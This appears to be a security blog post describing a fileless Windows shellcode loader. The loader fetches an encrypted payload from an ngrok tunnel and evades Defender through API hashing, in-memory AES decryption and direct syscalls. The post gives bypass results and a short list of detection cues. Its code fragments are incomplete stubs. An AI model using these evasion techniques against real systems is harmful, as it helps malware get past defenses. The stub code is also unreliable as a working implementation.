---
title: "Untitled"
date: undefined
slug: untitled
---

Sneaky Shellcode Shenanigans Windows Defender Dodging Loader

Overview

A deep technical breakdown of a fileless shellcode loader that bypasses Windows Defender through API hashing, encrypted payloads, and direct syscalls. This is the research behind my Beulah Intrusion project.

⚠️ Ethical Use Only — this research is for authorized security testing and education only.

The 5 Layer Evasion Stack

Modern endpoint protection requires modern evasion. This loader implements five complementary techniques:

Layer 1 Fileless execution — Evades signature based AV
Layer 2 API hashing — Evades import table analysis
Layer 3 Encrypted HTTPS fetch — Evades network inspection
Layer 4 AES decryption in memory — Evades static payload analysis
Layer 5 Direct syscalls — Evades user mode EDR hooks

Layer 1 Fileless Execution

No payload touches disk. The shellcode is fetched over HTTPS, decrypted in memory, and executed directly from an allocated memory region.

Layer 2 API Hashing Dynamic Resolution

Instead of importing suspicious functions like NtAllocateVirtualMemory directly, we hash function names and resolve them at runtime:

FARPROC GetHashedFunction(const std::string& moduleName, const std::string& functionName) {
    HMODULE hModule = GetModuleHandleA(moduleName.c_str());
    auto hash = [](const std::string& str) {
        size_t hash = 5381;
        for (char c : str) {
            hash = ((hash << 5) + hash) + c;
        }
        return hash;
    };
    size_t targetHash = hash(functionName);
    return nullptr;
}

Why it works — No suspicious imports appear in the IAT. EDRs miss the resolution entirely.

Layer 3 Payload Fetch via HTTPS and Ngrok

The encrypted payload is fetched using WinHTTP from a ngrok tunnel URL:

HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", ...);
WinHttpConnect(hSession, hostname, port, 0);

Defense Effectiveness

Defense              Evasion Method              Result
Windows Defender     Fileless and API hashing    Bypassed in testing
EDR User mode hooks  Direct syscalls             Partial evasion
Network IDS          TLS and ngrok tunnels       Strong evasion

Detection Opportunities

For defenders here's what to look for

Behavioral RWX memory allocation from non standard processes
Network Ngrok domain connections from unexpected apps
Syscall monitoring Direct Nt calls without user mode API calls

Final Thoughts

This loader shows why defense in depth matters. No single control stops everything.

GitHub Repository lab use only redacted payloads